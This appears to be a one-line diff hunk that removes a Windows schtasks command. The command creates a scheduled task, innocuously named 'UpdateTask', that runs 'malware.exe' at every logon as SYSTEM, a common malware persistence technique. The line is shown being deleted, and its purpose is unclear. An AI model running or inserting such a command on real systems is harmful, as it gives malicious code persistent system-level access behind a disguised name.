@@ -1,1 +1,0 @@
-schtasks.exe /create /tn "UpdateTask" /tr "malware.exe" /sc onlogon /ru SYSTEM
